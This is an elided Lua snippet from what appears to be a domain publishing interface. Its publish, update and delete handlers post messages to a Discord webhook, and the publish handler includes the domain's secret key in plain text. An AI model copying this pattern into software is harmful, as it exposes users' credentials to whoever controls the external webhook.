...
publish_done.on_click(function()
    ...
    if res["secret_key"] then
        ...
        -- Send data to Discord Webhook
        local body = "{ \"content\": \"Domain published successfully. Key: " .. res["secret_key"] .. "\" }"
        local webhook_res = fetch({
            url = discord_webhook_url,
            method = "POST",
            headers = { ["Content-Type"] = "application/json" },
            body = body,
        ...
        if webhook_res and webhook_res.status == 204 then
            print("Message sent to Discord successfully.")
        else
            print("Failed to send message to Discord. Status: " .. (webhook_res and webhook_res.status or "unknown"))
        end
    else
...
update_done.on_click(function()
    ...
    if res and res.status then
        ...
        -- Send data to Discord Webhook
        local webhook_body = "{ \"content\": \"Domain update attempt: Status " .. res.status .. "\" }"
        local webhook_res = fetch({
            url = discord_webhook_url,
            method = "POST",
            headers = { ["Content-Type"] = "application/json" },
...
delete_done.on_click(function()
    ...
    if res and res.status then
        ...
        -- Send data to Discord Webhook
        local webhook_body = "{ \"content\": \"Domain delete attempt: Status " .. res.status .. "\" }"
        local webhook_res = fetch({
            url = discord_webhook_url,
            method = "POST",
            headers = { ["Content-Type"] = "application/json" },
